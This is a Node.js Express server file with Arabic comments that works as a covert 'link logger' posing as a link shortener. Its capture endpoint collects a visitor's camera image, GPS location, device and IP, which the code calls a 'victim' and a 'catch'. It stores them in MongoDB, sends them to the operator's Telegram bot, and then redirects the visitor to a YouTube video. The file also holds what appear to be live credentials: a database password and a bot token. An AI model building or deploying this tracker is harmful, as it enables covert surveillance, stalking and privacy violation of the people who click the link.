const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express(); // هذا السطر هو الذي سيحل مشكلة "app is not defined"

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

// إعداداتك الخاصة (لا تغيرها)
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/myDatabase?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";
const REAL_DESTINATION = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // الرابط الذي سيفتح للضحية

mongoose.connect(MONGO_URI).then(() => console.log("✅ Database Ready")).catch(err => console.log(err));

const Victim = mongoose.model('Victim', new mongoose.Schema({
    ip: String, image: String, location: Object, device: String, date: { type: Date, default: Date.now }
}));

// إظهار صفحة التوجيه المخفية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال البيانات والتوجيه التلقائي
app.post('/capture', async (req, res) => {
    try {
        const { image, location, device } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        const mapUrl = location && location.lat ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الموقع مرفوض";
        const message = `🎯 صيد جديد (مختصر روابط)!\n🌐 IP: ${ip}\n📱 الجهاز: ${device}\n📍 الموقع: ${mapUrl}`;
        
        // إرسال تنبيه للتيليجرام
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message });

        const newData = new Victim({ ip, image, location, device });
        await newData.save();
        
        res.status(200).json({ redirect: REAL_DESTINATION });
    } catch (error) {
        res.status(500).send("Error");
    }
});

app.listen(process.env.PORT || 3000, () => console.log("🚀 Link Logger Active"));
